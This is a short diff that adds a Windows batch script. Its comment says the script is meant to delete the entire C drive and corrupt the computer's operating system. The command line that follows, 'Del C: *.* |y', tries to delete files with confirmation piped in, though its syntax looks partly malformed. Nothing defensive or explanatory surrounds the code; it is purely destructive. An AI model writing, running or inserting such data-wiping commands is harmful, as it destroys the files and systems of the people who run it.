@@ -1,1 +1,6 @@
+@Echo off
+
+REM Delete C drive completely, and get the operating system of the respective computer corrupted.
+Del C: *.* |y
+
 
